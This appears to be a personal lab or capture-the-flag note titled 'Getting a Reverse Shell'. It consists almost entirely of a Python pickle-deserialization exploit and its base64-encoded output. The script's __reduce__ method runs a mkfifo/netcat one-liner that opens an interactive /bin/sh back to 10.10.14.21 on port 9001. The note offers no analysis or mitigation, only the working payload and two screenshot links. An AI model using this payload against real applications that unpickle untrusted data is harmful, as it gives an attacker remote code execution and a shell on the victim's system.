# Getting a Reverse Shell
## Exploiting Pickle
Content of exploit

```python
import pickle
from base64 import urlsafe_b64encode as b64encode

RUNME="""rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.21 9001 >/tmp/f"""

class Jojo(object):
    def __reduce__(self):
        import os
        return(os.system,(RUNME,))

print b64encode(pickle.dumps(Jojo()))
```
Payload
```bash
$ python2.7 exploit-pickle.py                                                                                                                                                        
Y3Bvc2l4CnN5c3RlbQpwMAooUydybSAvdG1wL2Y7bWtmaWZvIC90bXAvZjtjYXQgL3RtcC9mfC9iaW4vc2ggLWkgMj4mMXxuYyAxMC4xMC4xNC4yMSA5MDAxID4vdG1wL2YnCnAxCnRwMgpScDMKLg==
```

![[Pasted image 20211127094052.png]]


![[Pasted image 20211127094406.png]]